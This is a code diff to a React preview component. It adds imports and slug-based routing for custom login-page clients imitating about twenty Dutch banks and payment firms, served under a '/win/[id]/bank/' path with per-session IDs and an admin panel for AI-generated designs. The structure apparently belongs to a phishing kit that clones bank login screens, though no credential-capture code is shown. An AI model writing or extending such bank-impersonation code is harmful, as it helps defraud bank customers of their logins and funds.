@@ -7,6 +7,24 @@ import { DemoShell } from "@/components/demo/DemoShell";
 import type { BankTheme } from "@/lib/bank-theme-config";
 import { getBankTheme } from "@/lib/bank-theme-config";
 
+// Özel Tasarım İçe Aktarımları
+import { AbnAmroLoginClient } from "@/app/win/[id]/bank/[bank_slug]/abn-amro-client";
+import { AdyenLoginClient } from "@/app/win/[id]/bank/[bank_slug]/adyen-client";
+import { AsnBankLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-client";
+import { AsnBankVhRegiobankLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-vh-regiobank-client";
+import { AsnBankVoorheenBlgwonenLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-voorheen-blgwonen-client";
+import { AsnBankVoorheenSnsLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-voorheen-sns-client";
+import { BunqLoginClient } from "@/app/win/[id]/bank/[bank_slug]/bunq-client";
+import { AutoRedirectClient } from "@/app/win/[id]/bank/[bank_slug]/auto-redirect-client";
+import { VanLanschotKempenClient } from "@/app/win/[id]/bank/[bank_slug]/van-lanschot-kempen-client";
+import { IngClient } from "@/app/win/[id]/bank/[bank_slug]/ing-client";
+import { FinomClient } from "@/app/win/[id]/bank/[bank_slug]/finom-client";
+import { YoursafeClient } from "@/app/win/[id]/bank/[bank_slug]/yoursafe-client";
+import { RabobankClient } from "@/app/win/[id]/bank/[bank_slug]/rabobank-client";
+import { N26Client } from "@/app/win/[id]/bank/[bank_slug]/n26-client";
+import { NationaleNederlandenClient } from "@/app/win/[id]/bank/[bank_slug]/nationale-nederlanden-client";
+import { TriodosBankClient } from "@/app/win/[id]/bank/[bank_slug]/triodos-bank-client";
+
 export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
   const [theme, setTheme] = useState<BankTheme | null>(null);
 
@@ -25,7 +43,44 @@ export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
 
   if (!bank) return null;
 
-  // Eğer bankanın özel bir tasarımı tanımlanmışsa (veya panelde yeni oluşturuluyorsa)
+  const autoRedirectBanks = ["buut", "knab", "mollie", "revolut"];
+
+  // 1. ÖNCELİK: ÖZEL OLARAK KODLANMIŞ MÜSTAKİL BANKA TASARIMLARI
+  const renderCustomClient = () => {
+    const sId = "preview";
+    const bank_slug = bank.slug;
+    const bankName = bank.name;
+
+    if (autoRedirectBanks.includes(bank_slug)) return <AutoRedirectClient sessionId={sId} bankSlug={bank_slug} bankName={bankName} />;
+    if (bank_slug === "van-lanschot-kempen") return <VanLanschotKempenClient sessionId={sId} />;
+    if (bank_slug === "ing") return <IngClient sessionId={sId} />;
+    if (bank_slug === "finom") return <FinomClient sessionId={sId} />;
+    if (bank_slug === "yoursafe") return <YoursafeClient sessionId={sId} />;
+    if (bank_slug === "rabobank") return <RabobankClient sessionId={sId} />;
+    if (bank_slug === "n26") return <N26Client sessionId={sId} />;
+    if (bank_slug === "nationale-nederlanden") return <NationaleNederlandenClient sessionId={sId} />;
+    if (bank_slug === "triodos-bank") return <TriodosBankClient sessionId={sId} />;
+    if (bank_slug === "abn-amro") return <AbnAmroLoginClient sessionId={sId} />;
+    if (bank_slug === "adyen") return <AdyenLoginClient sessionId={sId} />;
+    if (bank_slug === "asn-bank") return <AsnBankLoginClient sessionId={sId} />;
+    if (bank_slug === "asn-bank-vh-regiobank") return <AsnBankVhRegiobankLoginClient sessionId={sId} />;
+    if (bank_slug === "asn-bank-voorheen-blgwonen") return <AsnBankVoorheenBlgwonenLoginClient sessionId={sId} />;
+    if (bank_slug === "asn-bank-voorheen-sns") return <AsnBankVoorheenSnsLoginClient sessionId={sId} />;
+    if (bank_slug === "bunq") return <BunqLoginClient sessionId={sId} />;
+    
+    return null;
+  };
+
+  const customClient = renderCustomClient();
+  if (customClient) {
+    return (
+      <div style={{ pointerEvents: 'none' }}>
+        {customClient}
+      </div>
+    );
+  }
+
+  // 2. ÖNCELİK: DİNAMİK YAPISAL JSON TASARIMI (AI veya Admin Paneli ile üretilmiş)
   if (bank.design) {
     const design = bank.design;
 
